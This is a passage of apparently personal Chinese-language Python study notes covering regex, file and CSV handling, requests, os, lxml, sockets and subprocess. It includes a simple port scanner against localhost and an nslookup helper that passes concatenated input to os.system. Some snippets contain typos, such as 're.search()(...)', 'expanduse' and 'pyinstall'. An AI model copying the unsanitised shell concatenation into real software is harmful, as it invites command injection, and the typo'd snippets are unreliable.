+<h3 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
+<p>re模块包含一个findall()方法它能够以列表形式返回所有满足要求的字符串，若没有匹配到结果，就会返回空列表。<code>flags</code>表示一些特殊功能的标志</p>
+<h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search()(pattern,string,flags=0)</span><br></pre></td></tr></table></figure>
+<p>search()方法返回第一个匹配的值</p>
+<p>形式为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;re.Match object; span=(12, 27), match=&apos;密码是：weibomima1，&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>使用group获得search()返回的结果</p>
+<p>使用group(1)获得search()返回的结果中括号内的值</p>
+<h3 id="re-S"><a href="#re-S" class="headerlink" title="re.S"></a>re.S</h3><p>将<code>.</code>的作用扩展到整个字符串，包括<code>\n</code></p>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>Python文件操作mode如果想读取，必须为<code>&#39;r&#39;</code></p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = open (&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;)</span><br><span class="line">对文件进行操作</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;文件操作方式&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
+<p>第一种需要手动给关闭文件<br>第二种需要注意缩进，退出缩进Python就会自动关闭文件</p>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读取文件可以使用相对路径和绝对路径<br>相对路径是文本文件相对于现在的工作区而言的路径，并不总是相对于当前正在运行的这个Python文件的路径</p>
+<p>Python需要导入os模块来使用<code>~</code>表示家目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">real_path=os.path.expanduse(&apos;~/project/xxx&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="打开文件-1"><a href="#打开文件-1" class="headerlink" title="打开文件"></a>打开文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
+<h3 id="readlines"><a href="#readlines" class="headerlink" title="readlines()"></a>readlines()</h3><p>读取文件内容，将文件的每一行作为列表元素返回<br>readlines()会将文件内容取出，如果再次使用read()读取会返回空值</p>
+<h3 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h3><p>读取文件内容，将所有内容作为字符串返回</p>
+<h3 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h3><p>每次读取一行，使用循环读取所有内容</p>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;文件路径&apos;,&apos;w&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">	对文件进行操作</span><br></pre></td></tr></table></figure>
+<p>写文件有2种，w和a</p>
+<p>w覆盖掉之前的内容，a是追加内容</p>
+<h3 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h3><p>直接将一段字符串写入文本</p>
+<h3 id="writelines"><a href="#writelines" class="headerlink" title="writelines()"></a>writelines()</h3><p><code>writelines([&#39;line0&#39;,&#39;line1&#39;])</code></p>
+<p>在写文件时，Python不会添加换行符，需要手动添加</p>
+<h2 id="操作CSV文件"><a href="#操作CSV文件" class="headerlink" title="操作CSV文件"></a>操作CSV文件</h2><p>Python自带处理CSV文件的模块</p>
+<p>Python处理CSV文件需要有序字典形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br></pre></td></tr></table></figure>
+<h3 id="读CSV文件"><a href="#读CSV文件" class="headerlink" title="读CSV文件"></a>读CSV文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;csvfile&apos;,&apos;r&apos;,encoding=&apos;utf-8&apos;) as csvfile:</span><br><span class="line">	reader = csv.DictReader(file)</span><br><span class="line">	for row in reader:</span><br><span class="line">		print(row)</span><br></pre></td></tr></table></figure>
+<h3 id="写CSV文件"><a href="#写CSV文件" class="headerlink" title="写CSV文件"></a>写CSV文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;csvfile&apos;,&apos;a&apos;,encoding=&apos;utf-8&apos;) as csvfile:</span><br><span class="line">	writer = csv.DictWriter(csvfile,fieldnames=[&apos;name&apos;,&apos;age&apos;,&apos;salary&apos;])</span><br><span class="line">	writer.writeheader()</span><br><span class="line">	writer.writerows(data)</span><br><span class="line">	writer.writerow(&#123;&apos;name&apos;:Greeny,&apos;age&apos;:24,&apos;salary&apos;:99999&#125;)</span><br></pre></td></tr></table></figure>
+<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a>requests.get()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(&apos;url&apos;)</span><br></pre></td></tr></table></figure>
+<p>返回Response对象</p>
+<h3 id="Response-content"><a href="#Response-content" class="headerlink" title="Response.content"></a>Response.content</h3><p>返回二进制格式的网页内容</p>
+<h3 id="Response-content-decode"><a href="#Response-content-decode" class="headerlink" title="Response.content.decode()"></a>Response.content.decode()</h3><p>解码为字符格式的网页内容<br>该方法默认参数为<code>&#39;utf-8&#39;</code>，需要根据不同网页进行更改，其他参数有<code>&#39;GBK&#39;</code>，<code>&#39;GB2312&#39;</code>，<code>&#39;GB18030&#39;</code></p>
+<h3 id="Response-json"><a href="#Response-json" class="headerlink" title="Response.json()"></a>Response.json()</h3><p>返回Json格式的Response</p>
+<h3 id="requests-status-code"><a href="#requests-status-code" class="headerlink" title="requests.status_code"></a>requests.status_code</h3><p>返回响应状态码</p>
+<p>内置的状态码查询对象：<code>requests.codes.ok</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">html = requests.get(url)</span><br><span class="line">html.status_code</span><br><span class="line">html.status_code == requests.codes.ok</span><br></pre></td></tr></table></figure>
+<h2 id="multiprocessing模块"><a href="#multiprocessing模块" class="headerlink" title="multiprocessing模块"></a>multiprocessing模块</h2><h3 id="dummy模块"><a href="#dummy模块" class="headerlink" title="dummy模块"></a>dummy模块</h3><p>dummy下有一个Pool类，用来实现线程池，线程池下有一个map()方法，可以让线程池里面的所有线程都“同时”执行一个函数</p>
+<h4 id="Pool-map"><a href="#Pool-map" class="headerlink" title="Pool.map()"></a>Pool.map()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool.map(function,iterable)</span><br></pre></td></tr></table></figure>
+<p>第一个参数为函数，第二个参数为可迭代的对象：列表、元组、集合、字典</p>
+<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs()"></a>os.makedirs()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.makedirs(&apos;目录名&apos;,exist_ok=True)</span><br></pre></td></tr></table></figure>
+<p><code>exis_ok=True</code>当存在相同目录名时，不再创建</p>
+<h4 id="os-path-join"><a href="#os-path-join" class="headerlink" title="os.path.join()"></a>os.path.join()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(&apos;目录名&apos;,filename+&apos;.后缀名&apos;)</span><br></pre></td></tr></table></figure>
+<p>python会根据系统环境(Windows,Linux)添加斜杠</p>
+<h4 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir()"></a>os.listdir()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.listdir(&apos;dir&apos;)</span><br></pre></td></tr></table></figure>
+<p>返回列表，列表元素为文件名</p>
+<h4 id="os-rename"><a href="#os-rename" class="headerlink" title="os.rename()"></a>os.rename()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.rename(&apos;原文件名&apos;,&apos;新文件名&apos;)</span><br></pre></td></tr></table></figure>
+<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system()"></a>os.system()</h4><p>执行系统命令</p>
+<p>和<code>subprocess.Popen()</code>的区别：<code>subprocess</code>可以将执行结果通过STDOUT赋给变量</p>
+<h2 id="lxml模块"><a href="#lxml模块" class="headerlink" title="lxml模块"></a>lxml模块</h2><h3 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = selector.xpath(&apos;//div[@class=&quot;useful&quot;]/ul/li/test()&apos;)</span><br></pre></td></tr></table></figure>
+<p>直接返回列表，列表中是需要提取的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import lxml.html</span><br><span class="line">selector = lxml.fromstring(&apos;网页源代码&apos;)</span><br><span class="line">info = selector.xpath(&apos;XPath语句&apos;)</span><br></pre></td></tr></table></figure>
+<p>获取文本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../text()</span><br></pre></td></tr></table></figure>
+<p>获取属性值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//标签1[@属性1=&quot;属性值1&quot;]/标签2[@属性2=&quot;属性值2&quot;]/.../@属性n</span><br></pre></td></tr></table></figure>
+<p>需要使用独特的标签属性值过滤</p>
+<p>属性以某些字符串开头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//标签[starts-with(@属性名,&quot;相同的开头部分&quot;)]</span><br><span class="line">//div[starts-with(@id,&quot;test&quot;)]/test()</span><br></pre></td></tr></table></figure>
+<h1 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &lt;moudle1&gt;,&lt;module2&gt;</span><br><span class="line"></span><br><span class="line">def myFunction(): #自定函数</span><br><span class="line"></span><br><span class="line">def main():#定义主函数</span><br><span class="line">    myFunction()#调用函数</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:#调用时不会被直接执行</span><br><span class="line">	main()</span><br><span class="line">#Make a script both importable and executable</span><br></pre></td></tr></table></figure>
+<p><code>if __name__ == &quot;__main__&quot;:</code></p>
+<p>Python模块都包含内置的变量<code>__name__</code>，当运行模块被直接执行时，<code>__name__</code>等于<code>&quot;__main__&quot;</code>；如果import到其他模块中，则<code>__name__</code>等于模块名称(不包含后缀.py)。</p>
+<p>直接运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">print(&quot;First&quot;)</span><br><span class="line">print (&quot;%s&quot; %(__name__))</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print (&quot;Second&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//Output</span><br><span class="line">First</span><br><span class="line">__main__</span><br><span class="line">Second</span><br></pre></td></tr></table></figure>
+<p>作为模块导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#import_test.py</span><br><span class="line">import test</span><br><span class="line">print(&quot;======&quot;)</span><br><span class="line">print (__name__)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//Output</span><br><span class="line">First</span><br><span class="line">test</span><br><span class="line">======</span><br><span class="line">__main_</span><br></pre></td></tr></table></figure>
+<p><code>def __inti__(self,):</code></p>
+<p>在类的方法中，必须有<code>self</code>变量，因为python在调用方法时，会将self作为第一个参数传入方法，若不写<code>self</code>，会出现报错<br><code>__init__() takes 1 positional argument but 2 were given</code></p>
+<p>dir(object)</p>
+<p>以列表形式返回对象属性、方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#nslookup.py</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Domain:</span><br><span class="line">    def __init__(self,domain,port,protocol):</span><br><span class="line">        self.domain = domain</span><br><span class="line">        self.port = port</span><br><span class="line">        self.protocol =protocol</span><br><span class="line">    </span><br><span class="line">    def URL(self):</span><br><span class="line">        if self.protocol == &apos;https&apos;:</span><br><span class="line">            URL = &apos;https://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos;</span><br><span class="line">        if self.protocol == &apos;http&apos;:</span><br><span class="line">            URL = &apos;http://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos;</span><br><span class="line">        return URL</span><br><span class="line">    </span><br><span class="line">    def lookup(self):</span><br><span class="line">        os.system(&apos;nslookup&apos;+&apos; &apos;+self.domain)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    domain = Domain(&apos;www.chirec.github.io&apos;,&apos;80&apos;,&apos;http&apos;)</span><br><span class="line">    #print(dir(domain))</span><br><span class="line">    print(domain.URL())</span><br><span class="line">    print(domain.domain)</span><br><span class="line">    domain.lookup()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h2><p>sys模块可以让Python程序接收参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#sysExample.py</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">script = sys.argv[0]</span><br><span class="line">ip = sys.argv[1]</span><br><span class="line">port = sys.argv[2]</span><br><span class="line">print(&quot;[+] The script name is: &quot; + script)</span><br><span class="line">print(&quot;[+] The IP is:&quot; + ip + &quot; and port is: &quot; + port)</span><br></pre></td></tr></table></figure>
+<h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><h3 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h3><p>报错<code>a bytes-like object is required, not &#39;str&#39;</code><br>Python2和Python3在套接字返回值解码上有区别<br>string类型可以通过encode()方法编码为指定的bytes<br>bytes类型可以通过decode()方法解码为str，或使用<code>bytes(str,&#39;UTF-8&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.send(string)</span><br></pre></td></tr></table></figure>
+<p>将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</p>
+<h3 id="sendall"><a href="#sendall" class="headerlink" title="sendall()"></a>sendall()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.sendall(string)</span><br></pre></td></tr></table></figure>
+<p>将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。<br>内部通过递归调用send，将所有内容发送出去。</p>
+<h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto()"></a>sendto()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.sendto(string,address)</span><br></pre></td></tr></table></figure>
+<p>将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。该函数主要用于UDP协议。</p>
+<h3 id="connect"><a href="#connect" class="headerlink" title="connect()"></a>connect()</h3><p>连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket.connect((host,port))</span><br></pre></td></tr></table></figure>
+<h3 id="close"><a href="#close" class="headerlink" title="close()"></a>close()</h3><p>关闭socket</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket.close()</span><br></pre></td></tr></table></figure>
+<h3 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h3><p>将套接字绑定到地址。在<code>AF_INET</code>，以元组(host,port)的形式表示地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.bind((&apos;host&apos;,port))</span><br></pre></td></tr></table></figure>
+<h3 id="listen"><a href="#listen" class="headerlink" title="listen()"></a>listen()</h3><p>开始监听传入连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.listen(backlog)</span><br></pre></td></tr></table></figure>
+<p>backlog指定在拒绝连接之前，可以挂起的最大连接数量。</p>
+<h3 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h3><p>接收套接字的数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.recv(bufsize)</span><br></pre></td></tr></table></figure>
+<p>数据以字符串形式返回，bufsize指定最多可以接收的数量。</p>
+<h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom()"></a>recvfrom()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.recvfrom(bufsize)</span><br></pre></td></tr></table></figure>
+<p>与recv()类似，但返回值是<code>(data,address)</code><br>data是包含接收数据的字符串，address是发送数据的套接字地址。</p>
+<h3 id="SOCK-STREAM"><a href="#SOCK-STREAM" class="headerlink" title="SOCK_STREAM"></a>SOCK_STREAM</h3><p>1.数据流<br>2.一般是tcp/ip协议的编程<br>3.有保障的(即能保证数据正确传送到对方)面向连接的SOCKET，多用于资料(如文件)传送</p>
+<h3 id="SOCK-DGRAM"><a href="#SOCK-DGRAM" class="headerlink" title="SOCK_DGRAM"></a>SOCK_DGRAM</h3><p>1.数据包<br>2.udp协议网络编程<br>3.是无保障的面向消息的socket ， 主要用于在网络上发广播信息。</p>
+<h3 id="AF-INET"><a href="#AF-INET" class="headerlink" title="AF_INET"></a>AF_INET</h3><p>IPv4(默认)</p>
+<h3 id="AF-INET6"><a href="#AF-INET6" class="headerlink" title="AF_INET6"></a>AF_INET6</h3><p>IPv6</p>
+<h3 id="AF-UNIX"><a href="#AF-UNIX" class="headerlink" title="AF_UNIX"></a>AF_UNIX</h3><p>只能够用于单一的Unix系统进程间通信</p>
+<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><h4 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h4><p>由于逻辑或语法导致一个程序无法正常执行的问题</p>
+<h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>程序出错时标识的一种状态</p>
+<p>当异常发生时，程序不会再向下执行，而转去调用此函数的地方处理此函数并恢复到正常状态</p>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    可以触发异常的语法</span><br><span class="line">except 错误类型1 [as 变量1]</span><br><span class="line">    异常处理语句1</span><br><span class="line">except 错误类型2 [as 变量2]：</span><br><span class="line">        异常处理语句2</span><br><span class="line">except (错误类型3， 错误类型4):</span><br><span class="line">    异常处理语句3</span><br><span class="line">...</span><br><span class="line">except：</span><br><span class="line">    异常处理语句other</span><br><span class="line">else：</span><br><span class="line">    未发生异常语句</span><br><span class="line">finally：</span><br><span class="line">    最终语句</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#scanport.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">ports = [21,22,53,80,443,3306,3389]</span><br><span class="line">hosts = [&apos;127.0.0.1&apos;]</span><br><span class="line"></span><br><span class="line">for host in hosts:</span><br><span class="line">    for port in ports:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        print(&quot;[+] Attempting to connect to &quot;+ host + &quot;:&quot; +str(port))</span><br><span class="line">        s.connect((host,port))</span><br><span class="line">        banner = s.recv(1024)</span><br><span class="line">        s.send(&apos;Hello&apos;.encode())</span><br><span class="line">        if str(banner):</span><br><span class="line">            print(&quot;[+]&quot; + host + &quot;:&quot; + str(port) + &quot; open: \n&quot; + banner.decode())</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#udp_server.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 12600</span><br><span class="line">buf_size =128</span><br><span class="line">addr = (host,port)</span><br><span class="line">udp_server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">udp_server.bind(addr)</span><br><span class="line">while True:</span><br><span class="line">    print (&apos;waiting for message...&apos;)</span><br><span class="line">    data,addr = udp_server.recvfrom(buf_size)</span><br><span class="line">    print (&apos;...received from and return to:&apos; + str(addr) + &quot;: &quot; + data.decode())</span><br><span class="line">udp_server.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#udp_client.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 12600</span><br><span class="line">buf_size = 128</span><br><span class="line">addr = (host,port)</span><br><span class="line">udp_client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">while True:</span><br><span class="line">    data = input(&apos;&gt;&apos;)</span><br><span class="line">    if not data:</span><br><span class="line">        break</span><br><span class="line">    udp_client.sendto(data.encode(&apos;utf-8&apos;),addr)</span><br><span class="line">    data,server_addr = udp_client.recvfrom(buf_size)</span><br><span class="line">    print (&apos;...received from:&apos; + str(addr) + &quot;: &quot; + data.decode())</span><br><span class="line">udp_client.close()</span><br></pre></td></tr></table></figure>
+<h3 id="生成exe文件"><a href="#生成exe文件" class="headerlink" title="生成exe文件"></a>生成exe文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstall</span><br></pre></td></tr></table></figure>
+<p>安装完成之后在<code>Python37/Script</code>文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstall.ext --onefile</span><br></pre></td></tr></table></figure>
+<h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p>从python2.4版本开始,可以用subprocess这个模块来产生子进程,并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。<br>subprocess意在替代其他几个老的模块或者函数，比如：<code>os.system os.spawn* os.popen* popen2.* commands.*</code></p>
+<h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><p>subprocess模块定义了一个类： Popen</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen( args, </span><br><span class="line">      bufsize=0, </span><br><span class="line">      executable=None,</span><br><span class="line">      stdin=None,</span><br><span class="line">      stdout=None, </span><br><span class="line">      stderr=None, </span><br><span class="line">      preexec_fn=None, </span><br><span class="line">      close_fds=False, </span><br><span class="line">      shell=False, </span><br><span class="line">      cwd=None, </span><br><span class="line">      env=None, </span><br><span class="line">      universal_newlines=False, </span><br><span class="line">      startupinfo=None, </span><br><span class="line">      creationflags=0)</span><br></pre></td></tr></table></figure>
+<p>各项参数含义</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">参数</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">args</td>
+<td style="text-align:center">字符串或列表</td>
+</tr>
+<tr>
+<td style="text-align:center">bufsize</td>
+<td style="text-align:center">0 无缓冲<br>1行缓冲<br>其他正值缓冲区大小<br>负值采用默认系统缓冲(一般是全缓冲)</td>
+</tr>
+<tr>
